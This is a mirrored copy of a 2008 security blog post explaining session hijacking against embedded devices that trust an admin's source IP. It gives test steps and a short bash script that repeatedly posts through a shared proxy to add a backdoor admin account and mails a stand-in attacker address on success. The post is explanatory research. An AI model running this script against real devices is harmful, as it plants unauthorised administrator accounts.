@@ -1,0 +1,263 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/holes-in-embedded-devices-ip-based-session-management/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:55:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Holes in Embedded Devices: IP-based session management</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Holes in Embedded Devices: IP-based session management Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='DHCP/mDNS Injection Issues' href='../dhcpmdns-injection-issues/index.html' />
+<link rel='next' title='Holes in Embedded Devices: Binary state session management' href='../holes-in-embedded-devices-binary-state-session-management/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index767a.html?p=670' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-670" class="post">
+	<div class="post-title"><h2><span>Holes in Embedded Devices: IP-based session management</span></h2></div>
+	<div class="post-date"><span>published:</span> January 29th, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>Devices that implement IP address-based session management follow the algorithm described by the pseudocode shown below:</p>
+
+<pre><code>if (submitted username and submitted password) == (credentials on device config)
+then
+    do white-list userâ€™s source IP address
+</code></pre>
+
+<p>The implications are obvious: devices located in environments in which different users share the same proxy are vulnerable to administrative session hijacking attacks. Please note that this session hijacking attack has nothing to do with the classic TCP hijacking attack in which sequence numbers are predicted by the attacker. Therefore, attacking a device susceptible to a <q>IP address-based session management</q> vulnerability does not require the attacker to intercept/sniff the traffic between the victim admin user and the target device. Rather, this attack performs session hijacking at the <em>HTTP application layer</em> by providing the piece of information that is used by the target device to &#8220;know&#8221; who has access to authenticated resources on the web console: a trusted source IP address in this case.</p>
+
+<p>As an example, letâ€™s consider a corporate environment in which hundreds of users share the same proxy while browsing the web. Now, letâ€™s imagine that the administrator of the vulnerable device never checked the <em>bypass proxy server for local addresses</em> option on his/her web browser. In other words, the administrator usually configures the vulnerable device via a proxy which is used by everyone else in the network.</p>
+
+<p>The result is that any malicious user using the same proxy as the administrator of the target device, can gain full administrative access via the web console by simply adding the device&#8217;s IP address on the browserâ€™s address bar. Of course this attack would be more realistic by automating the process of hijacking the admin session on the web console and performing a malicious/interesting operation. i.e: backdoor the device by adding a new administrative account.</p>
+ 
+<p>Early versions of Checkpoint VPN-1 Edge, suffer from this vulnerability. As any other webapp pentester I started analyzing HTTP requests after logging in to the web console of this appliance. I quickly realized that no session IDs had been assigned to my HTTP session, neither was my browser submitting my username and password via common methods such as HTTP basic authentication. There was nothing being sent by my browser that would tell the VPN-1 Edge appliance that I was supposed to have access to the administrative functionalities. This led me to suspect that the appliance was simply trusting my IP address while the session hadnâ€™t yet timed out. So I simply performed the following checks which in order to test the potential <q>IP address-based session management</q> vulnerability:</p>
+
+<ol>
+<li>Opened a completely different browser rather than a new tab or window of the same browser. i.e.: Opera rather than Firefox</li>
+<li>Entered the URL of an administrative menu (i.e.: <code>http://192.168.10.1/network_settings.cgi</code>) on Opera and checked if I had access to it</li>
+</ol>
+
+<blockquote>Note: in the previous example, both Firefox and Opera were connecting via the same proxy, thus submitting HTTP requests to the VPN-1 appliance from the same source IP address.</blockquote>
+
+<p>Since the firewall kindly offered me all the administrative functionalities which allowed me to change settings, it was obvious that the device was vulnerable.</p>
+
+<p>However, at this point I needed to make sure that other IP addresses other than my current one could not access the admin features while the session was considered active (if this was possible the issue would be even more severe). Therefore I simply removed the proxy settings from my browser and tried accessing a URL that would return an administrative page on the device. Accessing the firewallâ€™s web console from a different IP address â€“ in this case the one assigned to my workstation &#8211; did <em>not</em> work. Therefore, it could be concluded that while the administrative session is considered active by the firewall (i.e.: has not timed out yet), the firewall simply trusts HTTP requests that come from the IP address that has been white-listed.</p>
+
+<p>Provided that the VPN-1 appliance had also trusted other source IP addresses, while the admin session was active, then the appliance would suffer from a binary state session management vulnerability which will be explained in my following post. Feel free to use the aforementioned test steps to test your appliance. Iâ€™ve seen several devices affected by this issue, so developers of embedded software and security researchers are recommended to add this vulnerability type to their security testing checklist!</p>
+
+<p>An aspect that is important to mention regarding <q>IP-based session management</q> holes is weather or not the affected device implements an idle session timeout period. In case a session timeout mechanism is implemented, the timeout period (i.e.: 10 minutes) matters a lot, as it defines the window of opportunity to launch a session hijacking attack.</p>
+
+<p>A possible technique that can be used to exploit short timeout periods consists of writing a script that attempts to perform a configuration change on the vulnerable device every X minutes, where X is smaller than the idle session timeout period of the vulnerable device.</p>
+
+<p>The following is a hypothetical bash script that would attempt to add a new account on the vulnerable device every 5 seconds:</p>
+
+<pre><code>#!/bin/bash
+
+target="192.168.10.1";
+email="attacker@evil-domain.foo"
+
+while true
+do
+    if curl -s -x sharedproxy.company.foo:3128 â€“d "operation=addaccount&amp;usr=hax0r&amp;pwd=s3cr3tP455" $target | grep "account added successfully" &gt; /dev/null
+    then
+        // log successful pwnage!!
+        mail $email -s "backdoor account added successfully"
+        exit 1
+    fi
+    sleep 5
+done</code></pre>
+
+<p><em>Enjoy playing with IP-based session hijacking attacks! As you can see they are trivial to launch once the attacker has enough details of the vulnerable device.</em><p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pagvac/index.html" title="Posts by pagvac" rel="author">pagvac</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/embedded/index.html" rel="tag">embedded</a> | <a href="../../tags/ip/index.html" rel="tag">ip</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-105121">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/e9e7690eccc0e9b2ab8ec6a375c96bbd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">ntp</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105121">
+			January 29, 2008 at 1:12 pm</a>		</div>
+
+		<p><a href="http://ha.ckers.org/blog/20070122/ip-trust-relationships-xss-and-you/" rel="nofollow">http://ha.ckers.org/blog/20070.....s-and-you/</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-105225">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105225">
+			January 29, 2008 at 3:29 pm</a>		</div>
+
+		<p>OK, trusting source IP addresses for authentication purposes on embedded devices is pretty bad, but doing the same thing on credit card transaction environments is just insane!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-105240">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/e0ffc23a6958661ccdfaa7ee27bcff05?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">C4</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105240">
+			January 29, 2008 at 3:57 pm</a>		</div>
+
+		<p>This could be used on any basic router as well, as long as the you can do it before the admin session TTL times out?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-105433">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105433">
+			January 29, 2008 at 9:56 pm</a>		</div>
+
+		<p>@C4 &#8211; you&#8217;re right. This type of attack could be launched against a basic router as well. Any embedded device could be affected by this vulnerability. Of course, provided that its administrative web interface solely trusts the admin&#8217;s source IP for authentication purposes.</p>
+<p>I wrote this post with any type of embedded devices in mind. i.e.: cameras, printers, VoIP phones, firewalls, routers, switches, etc &#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-105703">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/74fa022df54601ceafda9ca4846f3033?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Antrix</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105703">
+			January 30, 2008 at 9:12 am</a>		</div>
+
+		<p>Ohhhh, this is old &#8230;. They fixed it quite a while ago.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-105775">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-105775">
+			January 30, 2008 at 11:28 am</a>		</div>
+
+		<p>@Antrix &#8211; yes, you&#8217;re right: the VPN-1 Edge vuln is old. That&#8217;s why I said &#8220;Early versions of Checkpoint VPN-1 Edge&#8221;. </p>
+<p>I just mentioned VPN-1 Edge vuln as a real example. This post is NOT an advisory of a new vulenrability, but rather an explanation of IP address-based session management vulnerabilities.</p>
+<p>Thanks for your feedback everyone!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="670"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="31030e7c58" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/holes-in-embedded-devices-ip-based-session-management/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:55:45 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
